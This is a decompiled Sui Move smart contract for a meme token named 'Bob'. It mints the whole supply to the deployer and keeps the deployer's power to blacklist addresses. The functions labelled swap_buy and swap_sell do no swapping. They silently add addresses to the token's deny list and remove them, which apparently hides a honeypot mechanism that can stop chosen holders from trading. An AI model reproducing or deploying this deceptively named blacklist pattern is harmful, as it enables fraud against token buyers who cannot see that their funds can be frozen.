module 0xe8f0405a2b5115f7def345a05567bf634f955a34e3bb93f16ff9528f8abea772::bob {
    struct BOB has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: BOB, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<BOB>(arg0, 9, b"Bob", b"This is Bob. Copy and paste him", b"", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmS7oXaAwsvUEPVTiitMUruxEHWWJuWZDCYkzHHtzqjdEX"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<BOB>(&mut v3, 690000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<BOB>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<BOB>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<BOB>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<BOB>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<BOB>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<BOB>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<BOB>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

